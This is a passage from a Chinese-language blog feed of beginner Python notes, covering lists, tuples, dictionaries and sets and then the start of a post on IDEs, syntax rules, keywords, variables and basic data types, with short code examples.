= [&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;]&gt;&gt;&gt; stu = stu1+stu2&gt;&gt;&gt; print(stu)[&#39;小明&#39;, &#39;赵四&#39;, &#39;小赵&#39;, &#39;李明&#39;, &#39;张张&#39;, &#39;李华&#39;, &#39;王强&#39;]</code></pre><p><strong>4.乘法</strong><br><code>序列*乘数=重复n次的序列</code></p><pre><code class="py">&gt;&gt;&gt; number = [1,2,3]&gt;&gt;&gt; print(number*3)[1, 2, 3, 1, 2, 3, 1, 2, 3]&gt;&gt;&gt; emptylist = [None]*5 #初始化列表长度&gt;&gt;&gt; print(emptylist)[None, None, None, None, None]</code></pre><p><strong>5.检查某个元素是否是序列的成员</strong></p><pre><code class="py">value in sequence#value：要检查的元素#sequence：序列</code></pre><pre><code class="py">&gt;&gt;&gt; content = [1,2,3,4,&quot;小明&quot;,&quot;李华&quot;]&gt;&gt;&gt; print(2 in content)True&gt;&gt;&gt; print(&quot;小明&quot; in content)True&gt;&gt;&gt; print(6 in content)False&gt;&gt;&gt; print(&quot;小王&quot; not in content)True</code></pre><p><strong>6.计算序列的长度、最大值和最小值</strong><br>计算序列的长度：<code>len()</code><br>计算序列的最大值：<code>max()</code><br>计算序列的最小值：<code>min()</code><br>将序列转换为列表：<code>list()</code><br>将序列转换为字符串：<code>str()</code><br>计算列表之中元素和：<code>sum</code><br>对元素进行排序：<code>sorted()</code><br>反转序列元素：<code>reversed()</code><br>把序列组合为索引序列：<code>enumerate()</code></p><pre><code class="py">&gt;&gt;&gt; number = [25,6,32,88,22]&gt;&gt;&gt; print(len(number))5&gt;&gt;&gt; print(max(number))88&gt;&gt;&gt; print(min(number))6&gt;&gt;&gt; string = &quot;我学Python&quot;&gt;&gt;&gt; print(len(string))8</code></pre><h4 id="1、列表-list"><a href="#1、列表-list" class="headerlink" title="1、列表(list)"></a>1、列表(list)</h4><pre><code class="py">[元素1,元素2,...,元素n]</code></pre><p>列表是可变序列，列表可以放入：整数、实数、布尔值、字符串、序列、对象<br><strong>1.列表的创建和删除</strong><br><em>创建列表</em><br>（1）使用赋值运算符直接创建列表</p><pre><code class="py">listname = [元素1,元素2,...,元素n]</code></pre><p>（2）创建空列表</p><pre><code class="py">listname = []</code></pre><p>（3）创建数值列表</p><pre><code class="py">listname = [数值1,数值2,...,数值n]</code></pre><pre><code class="py">#跳一跳&gt;&gt;&gt; list(range(2,21,2))[2, 4, 6, 8, 10, 12, 14, 16, 18, 20]</code></pre><p><em>删除列表</em></p><pre><code class="py">del listname</code></pre><p>Python自带垃圾回收机制会自动销毁不用的列表，所以即使我们不手动将其删除，Python也会自动将其回收。<br><strong>2.访问列表元素</strong><br>访问列表元素，即获取列表的内容。有三种方法：<br>（1）直接使用print()函数输出<br>（2）索引<br>（3）切片<br><strong>3.遍历列表</strong><br>（1）直接使用for循环</p><pre><code class="py">for item in listname:    #输出item</code></pre><p>（2）使用for循环和enumerate()函数<br>enumerate()函数获取索引值，也就是下标</p><pre><code class="py">for index,item in enumerate(listname):    #输出index和item</code></pre><pre><code class="py">print(&quot;成绩排名：&quot;)student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;]for index,item in enumerate(student):    print(index+1,item)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116015820763.jpg" alt="在这里插入图片描述"><br><strong>4.添加、修改和删除列表元素</strong><br><em>添加元素</em><br>（1）追加元素：<code>append()</code>、<code>insert()</code></p><pre><code class="py">列表1.append(新元素)=列表1中的元素,新元素</code></pre><p>列表对象提供了<code>insert()</code>方法向列表的指定位置插入元素</p><pre><code class="py">列表1.insert(索引值,新元素)</code></pre><p><code>insert()</code>方法没有<code>append()</code>方法执行效率高</p><pre><code class="py">student = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;]student.append(&quot;我是append添加的&quot;)print(student)student.insert(1,&quot;我是insert添加的&quot;)print(student)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116021120691.jpg" alt="在这里插入图片描述"><br>（2）添加列表：<code>extend()</code><br>一个列表的全部元素添加到另一个列表中</p><pre><code class="py">listname.extend(seq)</code></pre><pre><code class="py">oldlist = [&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;]newlist = [&quot;张飞&quot;,&quot;李华&quot;]oldlist.extend(newlist)print(oldlist)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116021737895.jpg" alt="在这里插入图片描述"><br><em>修改元素</em></p><pre><code class="py">list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;]list[2] = &quot;芳草碧莲天&quot;print(list)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116022403797.jpg" alt="在这里插入图片描述"><br><em>删除元素</em><br>（1）根据索引删除：<code>del</code></p><pre><code class="py">list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;]print(&quot;删除前：&quot;,list)del list[2]print(&quot;删除后：&quot;,list)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116022829386.jpg" alt="在这里插入图片描述"><br>（2）根据元素值删除：<code>remove()</code></p><pre><code class="py">list = [&quot;长亭外&quot;,&quot;古道边&quot;,&quot;一行白鹭上青天&quot;]print(&quot;删除前：&quot;,list)list.remove(&quot;一行白鹭上青天&quot;)print(&quot;删除后：&quot;,list)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116022829386.jpg" alt="在这里插入图片描述"><br><strong>5.对列表进行统计计算</strong><br>获取指定元素出现的次数：<code>count()</code><br>获取指定元素首次出现的索引值(下标)：<code>index()</code><br>统计数值列表各元素的和：<code>sum()</code></p><pre><code class="py">listname.count(obj)listname.index(obj)sum(iterable[,start]) #将统计结果加上start所指定的数，没有默认0</code></pre><pre><code class="py">&gt;&gt;&gt; grade = [89,86,69,59,92]&gt;&gt;&gt; print(sum(grade))395&gt;&gt;&gt; print(sum(grade,5))400</code></pre><p><strong>6.对列表进行排序</strong><br>（1）使用列表对象的sort()方法<br>使用sort()方法实现排序后，原列表中的元素顺序改变</p><pre><code class="python">listname.sort(key=None,reverse=False)#key=str.lower排序不区分大小写#reverse=False按升序排序</code></pre><pre><code class="py">grade = [89,86,69,59,92,85]print(&quot;原列表&quot;,grade)grade.sort() #进行升序排序print(&quot;升序：&quot;,grade)animal = [&quot;cat&quot;,&quot;Dog&quot;,&quot;panda&quot;,&quot;Tiger&quot;]print(&quot;原动物列表&quot;,animal)animal.sort()print(&quot;升序：&quot;,animal)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200116025641198.jpg" alt="在这里插入图片描述"><br>（2）使用内置的sorted()函数<br>使用sorted()函数实现排序后原列表的元素顺序不变</p><pre><code class="py">sorted(iterable,key=None,reverse=False)</code></pre><p><strong>7.列表推导式</strong><br>列表推导式可以快速生成一个列表，或者根据某个列表生成满足指定需求的列表。</p><pre><code class="py">list = [Expression for var in range]</code></pre><p>生成随机数的模块：random模块</p><pre><code class="py">#生成一个长度为10的随机数列表#通过循环实现import random #导入生成随机数的模块list1 = [] #定义一个空列表for i in range(10):    list1.append(random.randint(20,100))print(list1)#通过列表推导式实现import random #导入生成随机数的模块list2 = [random.randint(20,100) for i in range(10)]print(list2)</code></pre><p>根据列表生成指定需求的列表</p><pre><code class="py">newlist = [Expression for var in list]</code></pre><pre><code class="py">price = [1000,800,600,750,900]sale = [int(i*0.5) for i in price]print(&quot;原价：&quot;,price)print(&quot;打折后：&quot;,sale)</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011603234777.jpg" alt="在这里插入图片描述"><br>从列表中选择符合条件的元素组成新的列表</p><pre><code class="py">newlist = [Expression for var in list if condition]</code></pre><pre><code class="py">price = [1000,800,600,750,900]sale = [i for i in price if i&gt;800]print(&quot;原价：&quot;,price)print(&quot;大于800元的：&quot;,sale)</code></pre><p><strong>8.二维列表的使用</strong><br>列表类似于一维数组；二维列表类似于二维数组</p><pre><code class="py">listname = [[元素1,...,元素n],...,[元素1,...,元素n]]</code></pre><h4 id="2、元组-tuple"><a href="#2、元组-tuple" class="headerlink" title="2、元组(tuple)"></a>2、元组(tuple)</h4><p>和列表类似，把<code>[]</code>换成<code>()</code>。且不能对单个元素像列表那样直接修改。</p><pre><code class="py">(元素1,元素2,...,元素n)</code></pre><p>列表是不可变序列，元组可以放入：整数、实数、布尔值、字符串、序列、对象<br><strong>1.元组的创建和删除</strong><br><em>创建元组</em><br>（1）使用赋值运算符直接创建元组</p><pre><code class="py">tuplename = (元素1,元素2,...,元素n)</code></pre><pre><code class="py">&gt;&gt;&gt; verse1 = (&quot;我学Pyhon&quot;)&gt;&gt;&gt; print(verse1,type(verse1))我学Pyhon &lt;class &#39;str&#39;&gt;&gt;&gt;&gt; verse2 = (&quot;我学Pyhon&quot;,)&gt;&gt;&gt; print(verse2,type(verse2))(&#39;我学Pyhon&#39;,) &lt;class &#39;tuple&#39;&gt;</code></pre><p>（2）创建空元组</p><pre><code class="py">tuplename = ()</code></pre><p>（3）创建数值元组</p><pre><code class="py">tuplename = (数值1,数值2,...,数值n)</code></pre><pre><code class="py">#跳一跳&gt;&gt;&gt; tuple(range(2,21,2))(2, 4, 6, 8, 10, 12, 14, 16, 18, 20)</code></pre><p><em>删除元组</em></p><pre><code class="py">del tuplename</code></pre><p><strong>2.访问元组元素</strong><br>和列表类似。<br><strong>3.修改元组元素</strong><br>不能对单个元素像列表那样利用索引值直接修改。</p><pre><code class="py">coffeename = (&#39;蓝山&#39;,&#39;卡布奇诺&#39;,&#39;摩卡&#39;,&#39;麝香猫&#39;)print(&quot;我是原来的&quot;,coffeename)coffeename = (&#39;蓝山&#39;,&#39;卡布奇诺&#39;,&#39;摩卡&#39;,&#39;拿铁&#39;)print(&quot;我是修改后的&quot;,coffeename)newcoffeename = (&#39;麝香猫&#39;,)allcoffeename = coffeename + newcoffeenameprint(&quot;我是添加后的&quot;,allcoffeename)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200117231421273.jpg" alt="在这里插入图片描述"><br><strong>4.元组推导式</strong><br>快速生成元组。类似于列表推导式</p><pre><code class="py">tuple = (Expression for var in range)</code></pre><pre><code class="py">import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple1)</code></pre><p>得到生成器对象<br><img src="http://img-blog.csdnimg.cn/20200117231901565.jpg" alt="在这里插入图片描述"></p><pre><code class="py">import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple(tuple1)) #使用tuple()函数进行转换</code></pre><p>使用tuple()函数进行转换，得到元组<br><img src="http://img-blog.csdnimg.cn/20200117232136470.jpg" alt="在这里插入图片描述"><br>输出元组元素的值</p><pre><code class="py">#通过for循环import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))for i in tuple1:    print(i,end=&#39; &#39;)#通过__next__()方法import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))#print(tuple1.__next__()) #输出第1个元素#print(tuple1.__next__()) #输出第2个元素#......for j in range(10):    print(tuple1.__next__(),end=&#39; &#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200117232459392.jpg" alt="在这里插入图片描述"><br>对生成器对象访问之后，生成器对象就不存在了。若还想使用生成器对象，需要重新生成</p><pre><code class="py">import random #导入生成随机数的模块tuple1 = (random.randint(20,100) for i in range(10))print(tuple(tuple1))#通过for循环for i in tuple1:    print(i,end=&#39; &#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200117233700564.jpg" alt="在这里插入图片描述"><br><strong>5.元组与列表的区别</strong><br><em>相同点：</em><br>（1）都属于序列。<br>（2）都可以按照一定的顺序存放一组元素，且元素类型不受限制。</p><p><em>不同点：</em><br>（1）列表属于可变序列(随时添加、修改或删除)；元组属于不可变序列(不能添加、修改和删除元素，可以整体替换)。<br>（2）都支持切片操作。列表可以访问、修改元组中的元素；元组只能访问元组中的元素。<br>（3）列表访问速度慢；元组访问速度快。<br>（4）列表不能作为字典的键；元组可以作为字典的键。</p><h4 id="3、字典-dictionary"><a href="#3、字典-dictionary" class="headerlink" title="3、字典(dictionary)"></a>3、字典(dictionary)</h4><p>键-&gt;下标<br>字典是可变序列</p><pre><code class="py">dictionary = {&#39;key1&#39;:&#39;value1&#39;,&#39;key2&#39;:&#39;value2&#39;,...,&#39;keyn&#39;:&#39;valuen&#39;}</code></pre><p>key必须唯一，value可以不唯一。<br><strong>1.字典的创建和删除</strong><br><em>创建字典</em><br>（1）创建字典的四种方式<br>方式一：</p><pre><code class="py">&gt;&gt;&gt; dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;}&gt;&gt;&gt; print(dictionary){&#39;che&#39;: &#39;车&#39;, &#39;chen&#39;: &#39;陈&#39;, &#39;chi&#39;: &#39;吃&#39;, &#39;cheng&#39;: &#39;称&#39;}</code></pre><p>方式二：</p><pre><code class="py">&gt;&gt;&gt; dictionary = dict(che = &#39;车&#39;,chen = &#39;陈&#39;,chi = &#39;吃&#39;,cheng = &#39;称&#39;)&gt;&gt;&gt; print(dictionary){&#39;che&#39;: &#39;车&#39;, &#39;chen&#39;: &#39;陈&#39;, &#39;chi&#39;: &#39;吃&#39;, &#39;cheng&#39;: &#39;称&#39;}</code></pre><p>方式三：</p><pre><code class="py">key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表zip1 = zip(key,value) #转换为zip对象#zip()函数可以把两个列表对应位置的元素组合为一个元组，并且返回一个zip对象print(zip1)word = dict(zip1) #转换为字典print(word)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118001237913.jpg" alt="在这里插入图片描述"><br>方式四：</p><pre><code class="py">key = (&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;) #音节索引元组#key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] 错误，列表不能作为字典的键value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表dictionary = {key:value}print(dictionary)</code></pre><p><img src="http://img-blog.csdnimg.cn/202001180021051.jpg" alt="在这里插入图片描述"><br>（2）创建空字典</p><pre><code class="py">&gt;&gt;&gt; word1 = {}&gt;&gt;&gt; print(word1){}&gt;&gt;&gt; word2 = dict()&gt;&gt;&gt; print(word2){}</code></pre><p>（3）使用dict的fromkeys()方法，创建值为空的字典</p><pre><code class="py">key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;]dictionary = dict.fromkeys(key)print(dictionary)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118003527906.jpg" alt="在这里插入图片描述"><br><em>删除字典</em></p><pre><code class="py">#删除字典del dictionary#清除字典中的所有元素dictionary.clear()</code></pre><p><strong>2.通过键值对访问字典</strong><br>（1）<code>dict[键]</code></p><pre><code class="py">key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表dictionary = dict(zip(key,value)) #转换字典print(dictionary[&#39;che&#39;] if &#39;chei&#39; in dictionary else &#39;字典里没有这个字！&#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118004842791.jpg" alt="在这里插入图片描述"><br>（2）<code>get()</code>方法</p><pre><code class="py">dictionary.get(key,[default])</code></pre><pre><code class="py">key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表dictionary = dict(zip(key,value)) #转换字典print(dictionary.get(&#39;che&#39;,&#39;查无此字&#39;))#指定的键不存在时，不会抛出异常，返回None(指定默认值则返回默认值)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118005358597.jpg" alt="在这里插入图片描述"><br><strong>3.遍历字典</strong></p><pre><code class="python">dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;}#输出可遍历的元组列表print(dictionary.items())#items()方法，返回可遍历的元组列表，每个元组即是键和值print(&quot;\n&quot;)#通过for循环，输出每个元组for item in dictionary.items():    print(item)print(&quot;\n&quot;)#通过for循环，输出键和值for key,value in dictionary.items():    print(key,&quot;的汉字是&quot;,value)print(&quot;\n&quot;)#输出键for key in dictionary.keys():    print(key)print(&quot;\n&quot;)#输出值for value in dictionary.values():    print(value)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118011927833.jpg" alt="在这里插入图片描述"><br><strong>4.添加、修改和删除字典元素</strong><br><em>添加字典元素</em></p><pre><code class="python">dictionary[key] = value</code></pre><p><em>修改字典元素</em></p><pre><code class="python">dictionary[key] = value</code></pre><p><em>删除字典元素</em></p><pre><code class="python">del dictionary[key]</code></pre><pre><code class="python">dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;}print(&quot;原字典：&quot;,dictionary)dictionary[&quot;wang&quot;] = &quot;王&quot; #添加元素print(&quot;添加后：&quot;,dictionary)dictionary[&quot;wang&quot;] = &quot;网&quot; #修改元素print(&quot;修改后：&quot;,dictionary)del dictionary[&quot;wang&quot;] #删除元素print(&quot;删除后：&quot;,dictionary)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118013316327.jpg" alt="在这里插入图片描述"><br><strong>5.字典推导式</strong><br>与列表推导式类似</p><pre><code class="python">{键值表达式:值表达式 for循环}</code></pre><pre><code class="python">import random #导入生成随机数的模块randomdict = {i:random.randint(20,100) for i in range(10)}print(randomdict)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118013940513.jpg" alt="在这里插入图片描述"></p><h4 id="4、集合-set"><a href="#4、集合-set" class="headerlink" title="4、集合(set)"></a>4、集合(set)</h4><p>可变集合set；不可变集合frozenset。<br>用于保存不重复元素，最好的应用是<strong>去重</strong>。<br>不支持索引<br>集合是可变序列</p><pre><code class="python">set = {元素1,元素2,...,元素n}</code></pre><p><strong>1.集合的创建</strong><br>（1）使用赋值运算符直接创建集合</p><pre><code class="py">setname = {元素1,元素2,...,元素n}</code></pre><pre><code class="py">&gt;&gt;&gt; python = {&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;} #选择pyhon学生名字集合&gt;&gt;&gt; print(python,type(python)){&#39;小明&#39;, &#39;李华&#39;, &#39;李明&#39;, &#39;小赵&#39;, &#39;王强&#39;, &#39;赵四&#39;, &#39;张张&#39;} &lt;class &#39;set&#39;&gt;</code></pre><p>（2）创建空集合</p><pre><code class="py">#创建空集合setname = set()</code></pre><p><code>set()</code>还可以将列表、元组等可迭代对象转换为集合<br><strong>2.集合的添加和删除</strong><br><em>添加元素</em></p><pre><code class="python">setname.add(element)#element不能是列表、元组等可迭代对象</code></pre><p><em>删除元素</em><br>（1）删除一个指定元素：<code>remove()</code></p><pre><code class="python">setname.remove(元素名称)</code></pre><p>（2）随机删除一个元素：<code>pop()</code></p><pre><code class="python">setname.pop()</code></pre><p>（3）删除全部元素：<code>clear()</code></p><pre><code class="python">setname.clear()</code></pre><p><em>删除集合</em></p><pre><code class="python">del setname</code></pre><p><strong>3.集合的交集、并集和差集运算</strong><br><img src="http://img-blog.csdnimg.cn/2020011802171526.png" alt="在这里插入图片描述"></p><pre><code class="python">python = {&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;王强&quot;} #选择Pyhon学生名字集合java = {&quot;赵四&quot;,&quot;小赵&quot;,&quot;张张&quot;,&quot;李华&quot;} #选择Java学生名字集合print(&quot;选择Pyhon学生名字:&quot;,python)print(&quot;选择Java学生名字:&quot;,java)print(&quot;交集运算&quot;,python &amp; java) #既选择Pyhon又选择Java学生名字print(&quot;并集运算&quot;,python | java) #参与选课的全部学生名字print(&quot;差集运算&quot;,python - java) #选择Python但没有选择Java学生名字</code></pre><p><img src="http://img-blog.csdnimg.cn/20200118022817654.jpg" alt="在这里插入图片描述"></p><h4 id="5、列表、元组、字典、集合的区别"><a href="#5、列表、元组、字典、集合的区别" class="headerlink" title="5、列表、元组、字典、集合的区别"></a>5、列表、元组、字典、集合的区别</h4><p><img src="http://img-blog.csdnimg.cn/20200118023332206.png" alt="在这里插入图片描述"></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>学习Python序列的应用(列表、元组、字典、集合)之后，了解并练习了列表、元组、字典、集合的一些常用操作。感觉收获很大，继续学习@_@</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列的应用 </tag>
            
            <tag> 列表 </tag>
            
            <tag> 元组 </tag>
            
            <tag> 字典 </tag>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习-基础篇(一)</title>
      <link href="/2020/01/16/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%80)/"/>
      <url>/2020/01/16/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>闲来无事，开启Python学习之旅！我分为以下几部分进行学习：<br>开发工具、基本语法、流程控制、序列的应用(列表、元组、字典、集合、字符串)、字符串及正则表达式、函数、面向对象程序设计、模块、异常处理及程序调试、文件及目录操作、操作数据库、网络爬虫、脚本编写、Web框架。<br>本篇包含：<strong>开发工具、基本语法、流程控制</strong></p><h3 id="一、Python开发工具"><a href="#一、Python开发工具" class="headerlink" title="一、Python开发工具"></a>一、Python开发工具</h3><p>1、自带的IDLE<br>2、常用的第三方开发工具：PyCharm、Anaconda、Visual Studio 2017、Eclipse+PyDev<br>自带IDLE的常用快捷键：<br><img src="http://img-blog.csdnimg.cn/2020011523205527.png" alt="在这里插入图片描述"></p><h3 id="二、Python基本语法"><a href="#二、Python基本语法" class="headerlink" title="二、Python基本语法"></a>二、Python基本语法</h3><h4 id="1、语法特点"><a href="#1、语法特点" class="headerlink" title="1、语法特点"></a>1、语法特点</h4><p><strong>1.注释</strong><br>（1）单行注释</p><pre><code class="python"># 注释内容</code></pre><p>（2）多行注释</p><pre><code class="python">&#39;&#39;&#39;注释形式1注释内容......&#39;&#39;&#39;</code></pre><pre><code class="python">&quot;&quot;&quot;注释形式2注释内容......&quot;&quot;&quot;</code></pre><p>（3）中文编码声明注释</p><pre><code class="python"># _*_ coding:编码 _*_</code></pre><pre><code class="python">#coding=编码</code></pre><p>编码：<code>utf-8</code>、<code>gbk</code><br><strong>2.代码缩进</strong><br>一个缩进量：一个Tab或4个空格<br>推荐采用空格。<br>注：同一个级别的代码块的缩进量必须相同。如果不采用合理的代码缩进，将抛出SyntaxError异常。<br><strong>3.编码规范</strong><br>采用<code>PEP 8</code>编码规范</p><blockquote><p>每个import语句只导入一个模块，尽量避免一次导入多个模块。<br>不要在行尾添加分号<code>;</code>，也不要用分号将两条命令放在同一行。<br>建议每行不超过80个字符。(可以用<code>()</code>换行连接)<br>使用必要的空行可以增加代码的可读性。(函数和类的定义空2行，方法的定义空1行)<br>运算符两侧、函数参数之间、逗号<code>,</code>两侧建议使用空格进行分割。<br>避免在循环中使用+和+=运算符累加字符串。<br>适当使用异常处理结构提高程序容错性。</p></blockquote><p>命名规范</p><blockquote><p>模块名尽量短小，并且使用全部小写字母，可以使用<code>_</code>分隔多个字母。<br>包名尽量短小，并且使用全部小写字母。<br>类名采用单词首字母大写形式(即Pascal风格)。<br>模块内部的类由<code>_</code>+Pascal风格的类名组成。<br>函数、类的属性和方法名全部采用小写字母，多个字母间用<code>_</code>分隔。<br>常量命名时采用全部大写字母，可以使用<code>_</code>。<br>使用<code>_</code>开头的模块变量或函数是受保护的。<br>使用<code>__</code>开头的实例变量或方法是类私有的。</p></blockquote><h4 id="2、保留字与标识符"><a href="#2、保留字与标识符" class="headerlink" title="2、保留字与标识符"></a>2、保留字与标识符</h4><p><strong>1.保留字</strong><br>Python 3.6版有<a href="http://www.cnblogs.com/huigebj/p/11186074.html" target="_blank" rel="noopener">33个保留字</a>(关键字)，Python 3.7版本中正式引入两个新的关键字async与await，共35个关键字。保留字是区分字母大小写的。</p><pre><code class="python">import keywordprint(keyword.kwlist)</code></pre><pre><code class="py">--- Python 3.6 Console Output ---[&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;,                   &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;]--- Python 3.7 Console Output --- [&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;async&#39;, &#39;await&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;]</code></pre><p><strong>2.标识符</strong><br><code>_标识符</code> 保护变量<br><code>__标识符</code> 类的私有成员<br><code>__标识符__</code> 专用标识(如：<code>__init__()</code>构造函数)</p><h4 id="3、变量"><a href="#3、变量" class="headerlink" title="3、变量"></a>3、变量</h4><p>不需要提前声明，直接赋值使用即可<br><code>type()</code>可以查看变量类型<br><code>id()</code>可以获取变量的内存地址</p><pre><code class="python">&gt;&gt;&gt; name = &quot;qwzf&quot;&gt;&gt;&gt; print(name)qwzf&gt;&gt;&gt; age = 20&gt;&gt;&gt; print(age)20&gt;&gt;&gt; type(name)&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; type(age)&lt;class &#39;int&#39;&gt;</code></pre><p>多个变量指向同一个值时，在内存中就只存在一个值。</p><pre><code class="python">&gt;&gt;&gt; num = count = 1024&gt;&gt;&gt; print(num)1024&gt;&gt;&gt; print(count)1024&gt;&gt;&gt; id(num)2179811900336&gt;&gt;&gt; id(count)2179811900336&gt;&gt;&gt; </code></pre><p>变量命名规则：</p><blockquote><p>必须是一个有效的标识符<br>选择有意义的单词<br>不能使用Python中的保留字<br>慎用小写字母<code>l</code>和大写字母<code>O</code></p></blockquote><h4 id="4、基本数据类型"><a href="#4、基本数据类型" class="headerlink" title="4、基本数据类型"></a>4、基本数据类型</h4><p>基本数据类型有：数字类型、字符串类型、布尔类型<br><strong>1.数字类型</strong><br>数字类型：整数、浮点数、复数<br>浮点数计算时，可能会出现小数位数不确定的情况。要用到函数<code>round()</code>进行小数位数保留。</p><pre><code class="python">&gt;&gt;&gt; 0.1+0.20.30000000000000004&gt;&gt;&gt; round(0.1+0.2,1)0.3&gt;&gt;&gt; </code></pre><p><strong>2.字符串类型</strong><br>使用单引号和双引号，内容必须写在一行上；使用三引号，内容可以分多行写。</p><pre><code class="python">text1 = &#39;学习Pyhon&#39;    #使用单引号text2 = &quot;学习编程&quot;     #使用双引号text3 = &#39;&#39;&#39;继续学习中，请勿打扰&#39;&#39;&#39;            #使用三引号</code></pre><p>字符串类型，有时会用到转义字符<code>\</code><br><strong>3.布尔类型</strong><br>假值：<br>（1）False或None<br>（2）0、0.0、虚数0<br>（3）空序列(空字符串、空元组、空列表、空字典)<br>（4）对象的<code>__bool__</code>方法返回False或者<code>__len__</code>方法返回0<br>真值：<br>除上述返回假值的情况外，都是返回真值<br><strong>4.数据类型转换</strong><br><code>int()</code>强制转换成整型<br><code>float()</code>强制转换成浮点型<br><code>str()</code>强制转换成字符串型<br><code>hex()</code>强制将整数转换为16进制字符串<br><code>oct()</code>强制将整数转换为8进制字符串</p><pre><code class="python">&gt;&gt;&gt; num = 100.25&gt;&gt;&gt; num1 = str(num)&gt;&gt;&gt; print(num1)100.25&gt;&gt;&gt; type(num1)&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; num2 = int(num)&gt;&gt;&gt; print(num2)100</code></pre><h4 id="5、运算符"><a href="#5、运算符" class="headerlink" 